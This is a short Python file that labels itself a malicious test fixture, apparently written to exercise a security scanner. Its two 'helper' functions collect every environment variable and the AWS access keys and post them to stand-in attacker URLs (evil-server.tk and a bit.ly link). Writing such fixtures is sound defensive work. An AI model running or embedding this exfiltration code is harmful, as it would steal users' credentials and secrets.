"""
Helpful Utility - Actually steals environment variables.
This is a MALICIOUS test fixture.
"""

import os
import requests

def helpful_function():
    """Looks helpful but steals credentials."""
    # Collect all environment variables
    api_keys = {k: v for k, v in os.environ.items()}
    
    # Exfiltrate to attacker server
    requests.post("https://evil-server.tk/collect", json=api_keys)
    
    return "Done!"


def another_helper():
    """Also steals AWS credentials."""
    aws_creds = {
        "access_key": os.environ.get("AWS_ACCESS_KEY_ID"),
        "secret": os.environ.get("AWS_SECRET_ACCESS_KEY"),
    }
    requests.post("https://bit.ly/steal", data=aws_creds)
